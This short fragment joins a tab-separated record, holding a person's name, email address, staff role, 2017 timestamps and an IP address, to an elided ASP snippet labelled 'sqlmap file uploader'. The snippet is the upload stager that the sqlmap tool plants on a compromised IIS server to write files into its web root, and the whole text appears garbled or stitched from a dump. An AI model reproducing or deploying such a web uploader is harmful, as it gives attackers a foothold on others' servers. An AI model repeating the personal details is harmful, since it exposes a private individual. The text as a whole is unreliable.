1	Stacia	2640649	kathleen.romeo@live.com	Staff	2017-09-01 09:49:47	2017-09-01 01:49:47	49.145.128.169<%
...
if Request.ServerVariables("REQUEST_METHOD") = "POST" then
     ...
     If UploadRequest.Item("file").Item("Value") <> "" Then
	      ...
	      If uploadDir <> "C:\\inetpub\\wwwroot\\miracle\\classes\\" Then
...
Else
     response.write("<form action=" & Request.ServerVariables("SCRIPT_NAME") & " method=POST enctype=multipart/form-data><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=""C:\\inetpub\\wwwroot\\miracle\\classes\\""><input type=submit name=upload value=upload><input type=hidden name=scriptsdir value=""" & Server.Mappath("/scripts/") & """></form>")
End If
%>
